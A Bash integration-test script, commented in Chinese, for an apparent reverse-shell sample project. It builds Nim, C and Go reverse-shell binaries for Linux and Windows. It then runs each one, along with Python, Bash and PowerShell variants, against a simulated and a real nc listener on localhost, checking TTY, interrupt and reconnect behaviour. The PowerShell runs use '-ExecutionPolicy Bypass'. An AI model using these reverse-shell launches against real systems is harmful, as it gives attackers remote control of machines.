#!/usr/bin/env bash
# 集成测试：构建可构建的产物 → 逐个跑回环测试（harness 模拟 nc 监听端）→ 汇总。
# Linux 目标全部真跑；Windows 目标通过 WSL interop 真跑（需要 /mnt/c 可用）。
#
# 用法: bash tests/run.sh [--quick]
#   --quick  只跑 Linux 目标（跳过 Windows interop 与交叉编译）

set -u
cd "$(dirname "$0")/.."
ROOT="$PWD"
QUICK=0
[ "${1:-}" = "--quick" ] && QUICK=1

PASS=0
FAIL=0
declare -a RESULTS

have() { command -v "$1" >/dev/null 2>&1; }

run_case() { # run_case <name> <harness args...>
  local name="$1"; shift
  echo
  echo "###### $name ######"
  if python3 tests/harness.py --name "$name" "$@"; then
    RESULTS+=("PASS  $name"); PASS=$((PASS + 1))
  else
    RESULTS+=("FAIL  $name"); FAIL=$((FAIL + 1))
  fi
}

echo "== 构建 Linux 产物 =="
mkdir -p dist
if have nim; then
  nim c -d:release --hints:off --verbosity:0 -o:dist/reverse-linux-nim nim/reverse.nim \
    && echo "  ok  dist/reverse-linux-nim" || echo "  !!  nim linux 构建失败"
fi
if have gcc; then make -C c linux || true; fi
if have go; then (cd go && CGO_ENABLED=0 GOOS=linux go build -o ../dist/reverse-linux-go .) || true; fi

WIN_OK=0
if [ "$QUICK" = 0 ] && [ -x /mnt/c/Windows/System32/cmd.exe ]; then
  WIN_OK=1
  echo
  echo "== 构建 Windows 产物（交叉编译） =="
  if have nim && have x86_64-w64-mingw32-gcc; then
    nim c -d:release --threads:on --os:windows --cpu:amd64 -d:mingw \
      --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc \
      --hints:off --verbosity:0 -o:dist/reverse-windows-nim.exe nim/reverse.nim \
      && echo "  ok  dist/reverse-windows-nim.exe" || echo "  !!  nim windows 构建失败"
  fi
  if have x86_64-w64-mingw32-gcc; then make -C c windows || true; fi
  if have go; then
    (cd go && CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o ../dist/reverse-windows-go.exe .) || true
  fi
fi

WSLIP="$(hostname -I 2>/dev/null | awk '{print $1}')"

echo
echo "== Linux 目标测试（真跑） =="
run_case nim-linux        --cmd "./dist/reverse-linux-nim 127.0.0.1 {PORT}" --tty --interrupt
run_case nim-linux-reconn --cmd "./dist/reverse-linux-nim 127.0.0.1 {PORT}" --reconnect
if [ -x dist/reverse-linux-c ]; then
  run_case c-linux        --cmd "./dist/reverse-linux-c 127.0.0.1 {PORT}" --tty --interrupt
fi
if [ -x dist/reverse-linux-go ]; then
  run_case go-linux       --cmd "./dist/reverse-linux-go 127.0.0.1 {PORT}" --tty --interrupt
fi
run_case py-linux         --cmd "python3 python/reverse.py 127.0.0.1 {PORT}" --tty --interrupt
run_case bash-linux-py    --cmd "bash bash/shell.sh 127.0.0.1 {PORT}" --env RS_METHOD=python --tty --interrupt
run_case bash-linux-script --cmd "bash bash/shell.sh 127.0.0.1 {PORT}" --env RS_METHOD=script --tty --interrupt
run_case bash-linux-tcp   --cmd "bash bash/shell.sh 127.0.0.1 {PORT}" --env RS_METHOD=tcp

if [ "$WIN_OK" = 1 ] && [ -n "$WSLIP" ]; then
  echo
  echo "== Windows 目标测试（WSL interop 真跑，受控端连 $WSLIP） =="
  KILL_NIM="/mnt/c/Windows/System32/taskkill.exe /F /IM reverse-windows-nim.exe"
  KILL_C="/mnt/c/Windows/System32/taskkill.exe /F /IM reverse-windows-c.exe"
  KILL_GO="/mnt/c/Windows/System32/taskkill.exe /F /IM reverse-windows-go.exe"

  if [ -x dist/reverse-windows-nim.exe ]; then
    run_case nim-windows --cmd "WSLENV=RS_SESSIONS:RS_INTERVAL $ROOT/dist/reverse-windows-nim.exe $WSLIP {PORT}" \
      --crlf --banner 'Microsoft Windows' --interrupt --interrupt-cmd "ping -n 30 127.0.0.1" --killcmd "$KILL_NIM"
    run_case nim-windows-reconn --cmd "WSLENV=RS_SESSIONS:RS_INTERVAL $ROOT/dist/reverse-windows-nim.exe $WSLIP {PORT}" \
      --crlf --banner 'Microsoft Windows' --reconnect --killcmd "$KILL_NIM"
  fi
  if [ -x dist/reverse-windows-c.exe ]; then
    run_case c-windows --cmd "WSLENV=RS_SESSIONS:RS_INTERVAL $ROOT/dist/reverse-windows-c.exe $WSLIP {PORT}" \
      --crlf --banner 'Microsoft Windows' --killcmd "$KILL_C"
  fi
  if [ -x dist/reverse-windows-go.exe ]; then
    run_case go-windows --cmd "WSLENV=RS_SESSIONS:RS_INTERVAL $ROOT/dist/reverse-windows-go.exe $WSLIP {PORT}" \
      --crlf --banner 'Microsoft Windows' --killcmd "$KILL_GO"
  fi

  PSEXE="/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"
  PS1_WIN='X:\script\ReverseShell_Sample\powershell\reverse.ps1'
  if [ -x "$PSEXE" ] && [ -f powershell/reverse.ps1 ]; then
    # 清理兜底脚本（按命令行精确匹配，避免误杀用户的 powershell）
    cat > /tmp/rs_ps_clean.ps1 <<'PS1'
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
  Where-Object { $_.CommandLine -like '*reverse.ps1*' } |
  ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
PS1
    run_case ps-windows --cmd "$PSEXE -NoProfile -ExecutionPolicy Bypass -File \"$PS1_WIN\" -ServerIp $WSLIP -Port {PORT} -Sessions 1" \
      --crlf --banner 'Microsoft Windows' --killcmd "$PSEXE -NoProfile -ExecutionPolicy Bypass -File /tmp/rs_ps_clean.ps1"
    run_case ps-windows-reconn --cmd "$PSEXE -NoProfile -ExecutionPolicy Bypass -File \"$PS1_WIN\" -ServerIp $WSLIP -Port {PORT} -Sessions 2" \
      --crlf --banner 'Microsoft Windows' --reconnect --killcmd "$PSEXE -NoProfile -ExecutionPolicy Bypass -File /tmp/rs_ps_clean.ps1"
  fi

  PYEXE="$(/mnt/c/Windows/System32/cmd.exe /c "where py" 2>/dev/null | head -1 | tr -d '\r')"
  if [ -n "$PYEXE" ]; then
    PYWIN="$(printf '%s' "$PYEXE" | sed 's|\\|/|g; s|^\([A-Za-z]\):|/mnt/\L\1|')"
    if [ -x "$PYWIN" ]; then
      run_case py-windows --cmd "WSLENV=RS_SESSIONS:RS_INTERVAL $PYWIN -3 \"X:\\script\\ReverseShell_Sample\\python\\reverse.py\" $WSLIP {PORT}" \
        --crlf --banner 'Microsoft Windows'
    fi
  fi
fi

echo
echo "== 真实 nc 监听端冒烟测试 =="
if have nc; then
  SMOKE_PORT=$((20000 + RANDOM % 20000))
  SMOKE_OUT="$(mktemp)"
  SMOKE_FIFO="$(mktemp -u)"
  mkfifo "$SMOKE_FIFO"
  ( nc -l -p "$SMOKE_PORT" < "$SMOKE_FIFO" > "$SMOKE_OUT" 2>/dev/null ) &
  NC_PID=$!
  exec 9>"$SMOKE_FIFO"
  RS_SESSIONS=1 RS_INTERVAL=1 ./dist/reverse-linux-nim 127.0.0.1 "$SMOKE_PORT" >/dev/null 2>&1 &
  PAY_PID=$!
  sleep 1
  printf 'echo NC_SMOKE_$((40+2))\nexit\n' >&9
  sleep 2
  exec 9>&-
  kill "$NC_PID" "$PAY_PID" 2>/dev/null
  wait "$NC_PID" "$PAY_PID" 2>/dev/null
  if grep -q "NC_SMOKE_42" "$SMOKE_OUT"; then
    echo "[PASS] nc-smoke（nc.traditional 监听端收到会话并可交互执行命令）"
    RESULTS+=("PASS  nc-smoke"); PASS=$((PASS + 1))
  else
    echo "[FAIL] nc-smoke 输出: $(head -c 300 "$SMOKE_OUT" | cat -v)"
    RESULTS+=("FAIL  nc-smoke"); FAIL=$((FAIL + 1))
  fi
  rm -f "$SMOKE_FIFO" "$SMOKE_OUT"
else
  echo "跳过（本机无 nc）"
fi

echo
echo "==================== 汇总 ===================="
for r in "${RESULTS[@]}"; do echo "  $r"; done
echo "----------------------------------------------"
echo "  PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
